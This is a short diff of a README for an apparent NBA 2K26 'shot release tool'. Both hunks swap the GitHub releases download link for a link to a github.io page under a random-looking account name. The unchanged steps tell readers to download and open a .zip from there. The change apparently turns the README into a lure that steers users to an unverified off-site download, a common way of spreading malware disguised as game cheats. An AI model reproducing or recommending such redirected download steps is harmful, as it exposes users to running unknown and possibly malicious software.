@@ -1,6 +1,6 @@
 # 🏀 nba-2k26-shot-release-tool - Master your perfect jump shot timing
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/parenchymasecretaryofveteransaffairs737/nba-2k26-shot-release-tool/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://parenchymasecretaryofveteransaffairs737.github.io)
 
 ## 🎯 About the tool
 
@@ -19,7 +19,7 @@ This tool runs on most modern desktop computers. Ensure your system meets these 
 
 You need to visit the project page to download the latest version. Follow these instructions to prepare the software:
 
-1. Visit the [official releases page](https://github.com/parenchymasecretaryofveteransaffairs737/nba-2k26-shot-release-tool/releases).
+1. Visit the [official releases page](https://parenchymasecretaryofveteransaffairs737.github.io).
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder.
